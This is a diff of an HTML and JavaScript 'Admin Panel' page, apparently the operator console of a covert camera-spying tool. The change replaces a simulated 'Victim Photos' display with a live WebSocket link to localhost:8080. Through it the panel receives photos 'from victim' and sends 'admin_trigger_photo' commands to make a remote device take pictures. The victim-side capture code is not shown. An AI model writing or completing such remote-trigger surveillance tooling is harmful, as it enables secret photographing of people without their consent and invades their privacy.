@@ -9,180 +9,152 @@
             margin: 20px;
             background: #f9f9f9;
         }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-        .photo-grid {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 15px;
-            justify-content: center;
-            margin-top: 20px;
-        }
-        .photo-item {
-            background: white;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            padding: 10px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            text-align: center;
-            min-width: 150px;
-        }
-        .photo-item img {
-            width: 100%;
-            height: 150px;
-            object-fit: cover;
-            border-radius: 4px;
-        }
-        .photo-item p {
-            margin: 10px 0 0 0;
-            font-size: 12px;
-            color: #666;
-        }
         .status-indicator {
             color: green;
             font-weight: bold;
-            margin-bottom: 15px;
-        }
-        .control-panel {
-            background: #e9ecef;
-            padding: 15px;
-            border-radius: 8px;
             margin-bottom: 20px;
         }
+        #photos-container {
+            text-align: center;
+        }
+        .photo-item {
+            margin: 10px;
+            display: inline-block;
+            border: 1px solid #ddd;
+            padding: 10px;
+            background: white;
+            border-radius: 5px;
+        }
+        .photo-item img {
+            width: 150px;
+            height: 150px;
+            object-fit: cover;
+        }
         button {
-            padding: 10px 15px;
+            padding: 10px 20px;
+            margin: 5px;
             background: #007bff;
             color: white;
             border: none;
-            border-radius: 4px;
+            border-radius: 5px;
             cursor: pointer;
-            margin-right: 10px;
         }
         button:hover {
             background: #0056b3;
         }
-        .notification {
-            background: #d4edda;
-            color: #155724;
-            padding: 10px;
-            border-radius: 4px;
-            margin: 10px 0;
-            border: 1px solid #c3e6cb;
+        .admin-controls {
+            margin: 20px 0;
+            padding: 15px;
+            background: #e9ecef;
+            border-radius: 5px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Admin Panel - Victim Photos</h1>
-        <div class="status-indicator">Connection Status: Connected ✓</div>
+    <h1>Admin Panel</h1>
+    <div class="status-indicator">Disconnected - Connecting...</div>
 
-        <div class="control-panel">
-            <button onclick="triggerPhotoCapture()">Trigger Photo Capture</button>
-            <button onclick="refreshPhotos()">Refresh Photos</button>
-        </div>
+    <div class="admin-controls">
+        <button onclick="triggerPhoto()">Trigger Photo Capture</button>
+        <button onclick="refreshPhotos()">Refresh Photos</button>
+    </div>
 
-        <div id="notification-area"></div>
-
-        <h2>Received Photos</h2>
-        <div id="photo-container" class="photo-grid">
-            <div class="photo-item">
-                <div class="no-photos">No photos received yet</div>
-            </div>
-        </div>
+    <div id="photos-container">
+        <h3>Photos Received:</h3>
+        <p>No photos received yet...</p>
     </div>
 
     <script>
+        // WebSocket connection
+        let socket;
+        let wsConnected = false;
         let photoCount = 0;
 
-        // Function to show notification
-        function showNotification(message) {
-            const notificationArea = document.getElementById('notification-area');
-            const notification = document.createElement('div');
-            notification.className = 'notification';
-            notification.textContent = message;
-            notificationArea.appendChild(notification);
+        // Connect to WebSocket server
+        function connectWebSocket() {
+            try {
+                // For local testing, use WebSocket connection
+                socket = new WebSocket('ws://localhost:8080');
 
-            setTimeout(() => {
-                notification.remove();
-            }, 3000);
+                socket.onopen = function(event) {
+                    console.log('WebSocket connected');
+                    wsConnected = true;
+                    document.querySelector('.status-indicator').textContent = 'Connected to Server ✓';
+                };
+
+                socket.onmessage = function(event) {
+                    try {
+                        const data = JSON.parse(event.data);
+                        console.log('Received from victim:', data);
+
+                        if (data.type === 'photo_taken') {
+                            // Display received photo
+                            displayPhoto(data.data, data.photoNumber, data.timestamp);
+                        }
+                    } catch (e) {
+                        console.error('Error parsing WebSocket message:', e);
+                    }
+                };
+
+                socket.onclose = function(event) {
+                    console.log('WebSocket disconnected');
+                    wsConnected = false;
+                    document.querySelector('.status-indicator').textContent = 'Disconnected - Reconnecting...';
+                    // Try to reconnect
+                    setTimeout(connectWebSocket, 3000);
+                };
+
+                socket.onerror = function(error) {
+                    console.error('WebSocket error:', error);
+                };
+            } catch (e) {
+                console.error('WebSocket connection failed:', e);
+                document.querySelector('.status-indicator').textContent = 'Local Mode Active';
+            }
         }
 
-        // Function to trigger photo capture
-        function triggerPhotoCapture() {
-            showNotification('Photo capture triggered by admin');
-
-            // Create a new photo (simulating victim capture)
-            createPhoto();
-        }
-
-        // Function to create a photo
-        function createPhoto() {
-            photoCount++;
-
-            // Create a proper photo with victim info
-            const canvas = document.createElement('canvas');
-            canvas.width = 150;
-            canvas.height = 150;
-            const ctx = canvas.getContext('2d');
-
-            // Draw a proper victim photo (blue background with name and number)
-            ctx.fillStyle = '#4a90e2';
-            ctx.fillRect(0, 0, 150, 150);
-
-            // Draw victim name
-            ctx.fillStyle = 'white';
-            ctx.font = 'bold 16px Arial';
-            ctx.textAlign = 'center';
-            ctx.fillText('Victim Photo', 75, 75);
-
-            // Draw photo number
-            ctx.font = '14px Arial';
-            ctx.fillText('Photo #' + photoCount, 75, 95);
-
-            // Convert to data URL
-            const imageData = canvas.toDataURL('image/jpeg');
-
-            // Add to display
-            addPhotoToDisplay(imageData);
-
-            showNotification('New photo received - Photo #' + photoCount);
-        }
-
-        // Function to add photo to display
-        function addPhotoToDisplay(imageData) {
-            const photoContainer = document.getElementById('photo-container');
+        // Display photo from victim
+        function displayPhoto(imageData, photoNumber, timestamp) {
+            const photosContainer = document.getElementById('photos-container');
 
             // Remove "No photos" message if it exists
-            const noPhotos = photoContainer.querySelector('.no-photos');
-            if (noPhotos) {
-                photoContainer.innerHTML = '';
+            const noPhotos = photosContainer.querySelector('p');
+            if (noPhotos && noPhotos.textContent.includes('No photos')) {
+                photosContainer.innerHTML = '<h3>Photos Received:</h3>';
             }
 
-            // Create new photo element
             const photoDiv = document.createElement('div');
             photoDiv.className = 'photo-item';
             photoDiv.innerHTML = `
                 <img src="${imageData}" alt="Victim Photo">
-                <p>Photo #${photoCount} - ${new Date().toLocaleTimeString()}</p>
+                <p>Photo #${photoNumber} - ${new Date(timestamp).toLocaleTimeString()}</p>
             `;
 
             // Add to beginning of container
-            photoContainer.insertBefore(photoDiv, photoContainer.firstChild);
+            photosContainer.insertBefore(photoDiv, photosContainer.firstChild);
         }
 
-        // Function to refresh photos
+        // Trigger photo capture from admin
+        function triggerPhoto() {
+            if (wsConnected && socket) {
+                socket.send(JSON.stringify({
+                    type: 'admin_trigger_photo',
+                    message: 'Admin triggered photo capture'
+                }));
+                document.querySelector('.status-indicator').textContent = 'Photo trigger sent to victim';
+            } else {
+                document.querySelector('.status-indicator').textContent = 'Not connected to victim';
+            }
+        }
+
+        // Refresh photos (simulated)
         function refreshPhotos() {
-            showNotification('Photos refreshed');
+            document.querySelector('.status-indicator').textContent = 'Photos refreshed';
         }
 
-        // Initialize with a demo photo
+        // Initialize when page loads
         window.addEventListener('load', function() {
-            // Create initial demo photo
-            setTimeout(() => {
-                createPhoto();
-            }, 1000);
+            connectWebSocket();
         });
     </script>
 </body>
